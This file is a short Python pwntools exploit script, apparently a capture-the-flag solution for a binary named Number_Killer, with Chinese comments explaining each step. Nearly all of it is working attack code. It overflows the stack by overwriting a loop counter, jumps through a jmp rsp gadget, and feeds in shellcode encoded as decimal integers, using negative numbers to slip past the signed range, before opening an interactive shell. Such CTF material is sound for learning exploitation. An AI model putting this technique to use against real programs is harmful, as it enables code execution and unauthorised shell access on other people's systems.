# -*- coding: utf-8 -*
from pwn import*
import time

#cn=remote('47.103.214.163',20001)
cn=process('./Number_Killer')

for i in range(1,14):        #将局部变量i覆盖成 0xB，然后就可以一直输入造成溢出
  cn.sendline('47244640256')
  sleep(0.1)


cn.sendline('4196237')  #atoll 函数将10进制转换为16进制。  0x40078D  刚好为jmp rsp指令
gdb.attach(cn)
sleep(0.1)                            #执行 ret 前，进行栈恢复  rbp换成新的rsp
cn.sendline('7074926021049463112')   # 后面为shellcode
sleep(0.1)
cn.sendline('-1458805190845043095')  # 利用负数绕过有符号 long long 的正数上限
sleep(0.1)
cn.sendline('5212724049075524360')
sleep(0.1)
cn.sendline('5562984097417') 
sleep(0.1)
cn.sendline('5562984097417')#填充物
sleep(0.1)
cn.sendline('5562984097417')
cn.interactive()
#  本题直接将 jmp rsp  + shellcode 转换的十进制 往后面堆即可
